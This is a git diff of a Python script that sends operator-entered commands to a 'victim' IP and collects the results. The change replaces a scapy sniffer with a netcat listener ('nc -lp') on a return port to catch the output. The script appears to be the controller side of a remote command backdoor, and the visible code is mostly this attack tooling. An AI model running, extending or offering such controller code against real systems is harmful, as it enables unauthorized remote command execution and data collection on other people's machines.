@@ -9,19 +9,11 @@ def get_IF_NAME():
     tokens = popen("ip route | grep default", 'r').read().split(" ")
     return tokens[tokens.index("dev")+1]
 
-keep_sniffing = True
-def process_packet(packet):
-    global keep_sniffing
-    print("Has packet")
-    if packet.haslayer(TCP) and packet[TCP].dport == RETURN_PORT:
-        if packet.haslayer(Raw):
-            payload = packet[Raw].load
-            output = payload.decode('utf-8').strip()
-            print(output)
-            keep_sniffing = False
-
-def start_sniffing():
-    sniff(iface=get_IF_NAME(), filter=f"tcp && port {RETURN_PORT}", prn=process_packet, store=0)
+caught = False
+def catch_response():
+    global caught
+    print(popen(f"nc -lp {RETURN_PORT}").read())
+    caught = True
 
 def send_command(vic_ip, cmd):
     print(vic_ip, cmd)
@@ -33,15 +25,15 @@ def main():
     command = input("Command: ")
 
     # Start sniffing in a separate thread
-    sniffing_thread = threading.Thread(target=start_sniffing, daemon=True)
+    sniffing_thread = threading.Thread(target=catch_response, args=(), daemon=False)
     sniffing_thread.start()
 
-    # Send the command to the victim IP
     send_command(vic_ip, command)
 
-    # Wait until sniffing is complete
-    while keep_sniffing:
+    while not caught:
         sleep(0.1)
+    sniffing_thread.join()
+    # Send the command to the victim IP
 
 if __name__ == "__main__":
     main()
